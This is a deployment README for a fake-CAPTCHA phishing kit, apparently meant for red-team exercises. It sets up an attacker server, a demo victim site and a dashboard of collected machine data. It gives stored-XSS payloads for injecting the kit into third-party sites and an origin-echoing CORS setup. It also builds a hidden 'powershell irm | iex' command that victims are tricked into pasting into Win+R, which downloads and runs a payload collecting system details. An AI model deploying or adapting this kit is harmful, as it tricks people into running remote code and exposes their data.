# Deployment

The stack is two Flask apps served by gunicorn:

| Service | Role | Internal port |
|---|---|---|
| `fakecaptcha` | Attacker server (captcha, SDK, PS1 payload, dashboard) | 8080 |
| `client` | Example victim site that embeds the SDK | 5000 |

Nginx sits in front, unifying both under a single origin (required for
`postMessage`, cookies, and CORS to work correctly).

Two ways to run nginx. Pick one.

---

## Before you start

```bash
cp .env.example .env
# Edit .env: set PUBLIC_URL to the real public-facing URL
```

`PUBLIC_URL` is what the victim's browser sees. It must match exactly how you
access the service (scheme, host, port). Examples:

- `https://drive-verify.example.com`
- `http://192.168.1.50:8080` (lab only)

---

## Option A — Host nginx (recommended if the server already runs other sites)

Apps bind to loopback only; your existing nginx proxies to them.

```bash
docker compose -f docker-compose.yml up -d --build
```

This starts:

- `127.0.0.1:${FAKECAPTCHA_PORT:-8080}` → fakecaptcha server
- `127.0.0.1:${CLIENT_PORT:-5000}` → client site

Add the site to your nginx:

```bash
sudo cp nginx/nginx.conf /etc/nginx/conf.d/fakecaptcha.conf
# Edit server_name and TLS block as needed
sudo nginx -t && sudo systemctl reload nginx
```

`nginx/nginx.conf` already points to `127.0.0.1:8080` and `127.0.0.1:5000`.

---

## Option B — Docker nginx (server without its own nginx)

The overlay `docker-compose.nginx.yml` adds an nginx container to the stack.

```bash
docker compose -f docker-compose.yml -f docker-compose.nginx.yml up -d --build
```

Control the bind address with variables (in `.env` or inline):

```bash
INTERFACE=0.0.0.0 PORT=8080 \
  docker compose -f docker-compose.yml -f docker-compose.nginx.yml up -d
```

- `INTERFACE` — host interface to bind (`0.0.0.0` = all, `127.0.0.1` = local only)
- `PORT` — public host port

Nginx reaches the apps over the internal compose network by service name,
using `nginx/nginx.docker.conf`.

---

## Stop / logs

```bash
docker compose -f docker-compose.yml [-f docker-compose.nginx.yml] down
docker compose logs -f fakecaptcha
```

---

## Using only the SDK (without the demo client)

The `client/` component is just a demo. In a real exercise you skip it
and inject the SDK into the actual target page.

### On your own pages

```html
<script src="https://<your-domain>/sdk.js"></script>
<div id="captcha-box"></div>
<script>
  MiAuth.login('#captcha-box', function (data, verificationId) {
    // User completed the flow
  });
</script>
```

The SDK detects its own origin from `document.currentScript.src`, so the
`<script src>` URL is all you need to point at the fakecaptcha server.

### On pages you don't control (Stored XSS)

When you have a Stored XSS vector on a target site, inject the SDK with a
minimal payload:

```html
<script src="https://<your-domain>/sdk.js"></script><script>MiAuth.login();</script>
```

`MiAuth.login()` with no arguments appends the fake CAPTCHA to `<body>`.
Pass a CSS selector to position it inside a specific element:

```html
<script src="https://<your-domain>/sdk.js"></script>
<script>MiAuth.login('#login-form');</script>
```

For JavaScript-only injection contexts:

```javascript
var s=document.createElement('script');s.src='https://<your-domain>/sdk.js';s.onload=function(){MiAuth.login()};document.head.appendChild(s);
```

**CORS note:** The `/check-captcha` endpoint echoes back the request's
`Origin` header, so the SDK works from any domain without extra
configuration — including Stored XSS on third-party sites.

To run only the fakecaptcha server (no demo client):

```bash
docker compose -f docker-compose.yml up -d --build fakecaptcha
```

---

## Customizing the clipboard command

The command the victim pastes in Win+R is built in
`fakecaptcha/templates/captcha.html`, inside `buildClipboard()`:

```js
var base = window.location.href.replace(/\/captcha(\?.*)?$/, '');
var psUrl = base + '/s?t=' + vid;
var cmd = "powershell -w hidden -nop -c \"irm '" + psUrl + "' | iex #" + ploy + "\"";
```

The URL is computed from the page origin automatically — no hardcoded URLs.

## Customizing collected data

Edit `fakecaptcha/template.ps1`. The WMI queries are straightforward
PowerShell — add or remove fields as needed:

```powershell
$d.NewField = (gwmi Win32_SomeClass).SomeProperty
```

The `/datos` endpoint accepts any JSON with at least a `NombreEquipo` field.

## HTTPS

Always deploy under HTTPS for a credible simulation. A fake CAPTCHA over
plain HTTP is more suspicious to the target. Use Let's Encrypt, a corporate
certificate, or a reverse proxy with TLS termination.

## Protecting the dashboard

`/dashboard` and `/equipo/<hostname>` expose PII. In production:

- Add authentication at the proxy level (basic auth, IP restriction, VPN).
- Restrict filesystem access to `db/db.json`.
- Delete `db/db.json` after the exercise and report delivery.
